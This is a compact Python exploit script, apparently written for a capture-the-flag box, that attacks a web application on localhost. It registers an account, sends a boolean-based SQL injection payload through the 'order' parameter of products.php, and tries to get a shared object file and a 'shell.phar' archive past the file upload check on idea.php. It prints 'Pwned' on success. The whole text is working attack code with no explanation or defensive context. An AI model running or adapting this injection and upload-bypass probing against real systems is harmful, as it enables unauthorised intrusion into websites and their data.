#!/usr/bin/env python3
import requests, io, zipfile

u="http://localhost:80"

def mkzip():
    m=io.BytesIO()
    with zipfile.ZipFile(m,"w",zipfile.ZIP_DEFLATED) as z:z.writestr("t.txt","x")
    m.seek(0)
    return m.getvalue()

def mask():
    a=requests.Session()
    a.post(u+"/register.php",data={"name":"h4x0r","email":"exploit@dark.htb","password":"pyp"},allow_redirects=False)
    return a

def sqli(a):
    p=["name+and+case+when+3933%3d3933+then+3933+else+json(char(107,86,85,107))+end"]
    for x in p:
        r=a.get(u+"/products.php?name=1&order="+x)
        if r.status_code==200:
            return True
    return False

def arup(a):
    try:
        with open("1Bl39ewB9b.so","rb") as f:
            r=a.post(u+"/idea.php",files={"file":("X1.so",f.read())})
            if r.status_code==200 and "Invalid file"not in r.text:
                return True
    except:pass
    r=a.post(u+"/idea.php",files={"file":("shell.phar",mkzip())})
    return r.status_code==200 and"Invalid file"not in r.text

def main():
    s=mask()
    if sqli(s) or arup(s):print("Pwned")
    else:print("No luck")

if __name__=="__main__":
    main()
